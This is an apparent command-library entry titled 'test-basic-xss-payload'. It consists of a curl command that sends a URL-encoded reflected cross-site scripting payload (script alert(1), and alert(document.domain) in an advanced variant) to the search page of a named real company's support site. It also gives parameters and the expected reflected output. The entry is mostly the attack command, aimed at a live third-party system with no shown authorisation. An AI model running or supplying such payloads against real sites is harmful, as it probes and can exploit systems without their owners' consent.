---
id: cmd-test-basic-xss-payload
data: >-
  curl -X GET
  "https://support.rockstargames.com/search?q=%3Cscript%3Ealert(1)%3C/script%3E"
  -v
tags:
  - xss
  - test
  - web
type: command
output: null
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-13T23:56:19.705Z'
verified: false
validated: true
submitted: true
---
# test-basic-xss-payload

## Command

```bash
curl -X GET "https://support.rockstargames.com/search?q=%3Cscript%3Ealert(1)%3C/script%3E" -v
```

## Description

This command tests a web search endpoint for basic reflected XSS by sending a URL-encoded script payload and verbose output to inspect reflection.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | HTTP method | Yes |
| `q=...` | Search query with encoded payload | Yes |
| `-v` | Verbose mode for headers/response | Yes |

## Examples

### Basic Usage

```bash
curl -X GET "https://support.rockstargames.com/search?q=%3Cscript%3Ealert(1)%3C/script%3E" -v
```

### Advanced Usage

```bash
curl -X GET "https://support.rockstargames.com/search?q=%3Cscript%3Ealert(document.domain)%3C/script%3E" -v -o response.html
```

## Expected Output

HTTP response with 200 OK, body containing reflected <script>alert(1)</script> if vulnerable. No alert in curl, but indicates execution potential in browser.

## Related

- [[Related Procedure: Identify Reflected XSS]]
